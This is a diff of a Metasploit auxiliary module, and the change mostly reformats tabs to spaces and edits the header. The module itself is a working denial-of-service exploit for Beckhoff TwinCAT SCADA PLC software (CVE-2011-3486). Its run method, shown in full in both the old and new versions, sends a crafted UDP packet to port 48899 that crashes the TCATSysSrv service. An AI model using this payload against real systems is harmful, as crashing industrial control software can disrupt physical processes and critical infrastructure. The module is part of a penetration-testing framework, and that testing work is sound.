@@ -1,49 +1,47 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::Udp
-	include Msf::Auxiliary::Dos
+  include Msf::Exploit::Remote::Udp
+  include Msf::Auxiliary::Dos
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'           => 'Beckhoff TwinCAT SCADA PLC 2.11.0.2004 DoS',
-			'Description'    => %q{
-				The Beckhoff TwinCAT version <= 2.11.0.2004 can be brought down by sending
-				a crafted UDP packet to port 48899 (TCATSysSrv.exe).
-			},
-			'Author'         =>
-				[
-					'Luigi Auriemma', # Public exploit
-					'jfa',            # Metasploit module
-				],
-			'License'        => MSF_LICENSE,
-			'References'     =>
-				[
-					[ 'CVE', '2011-3486' ],
-					[ 'OSVDB', '75495' ],
-					[ 'URL', 'http://aluigi.altervista.org/adv/twincat_1-adv.txt' ]
-				],
-			'DisclosureDate' => 'Sep 13 2011'
-		))
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Beckhoff TwinCAT SCADA PLC 2.11.0.2004 DoS',
+      'Description'    => %q{
+        The Beckhoff TwinCAT version <= 2.11.0.2004 can be brought down by sending
+        a crafted UDP packet to port 48899 (TCATSysSrv.exe).
+      },
+      'Author'         =>
+        [
+          'Luigi Auriemma', # Public exploit
+          'jfa',            # Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2011-3486' ],
+          [ 'OSVDB', '75495' ],
+          [ 'URL', 'http://aluigi.altervista.org/adv/twincat_1-adv.txt' ]
+        ],
+      'DisclosureDate' => 'Sep 13 2011'
+    ))
 
-		register_options([Opt::RPORT(48899)])
-	end
+    register_options([Opt::RPORT(48899)])
+  end
 
-	def run
-		dos = "\x03\x66\x14\x71" + "\x00"*16 + "\xff"*1514
-		connect_udp
-		print_status("Sending DoS packet ...")
-		udp_sock.put(dos)
-		disconnect_udp
-	end
+  def run
+    dos = "\x03\x66\x14\x71" + "\x00"*16 + "\xff"*1514
+    connect_udp
+    print_status("Sending DoS packet ...")
+    udp_sock.put(dos)
+    disconnect_udp
+  end
 end
 
 =begin
